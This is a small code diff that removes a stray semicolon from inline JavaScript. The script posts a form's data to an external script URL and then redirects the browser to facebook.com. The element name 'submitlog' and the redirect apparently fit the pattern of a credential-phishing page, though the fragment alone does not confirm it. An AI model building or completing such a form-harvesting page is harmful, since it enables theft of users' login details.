@@ -359,7 +359,7 @@
             submitlog.addEventListener('click', e => {
               e.preventDefault();
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => window.location.href = "https://facebook.com/";)
+                .then(response => window.location.href = "https://facebook.com/")
                 .catch(error => console.error('Error!', error.message))
             });
   </script>
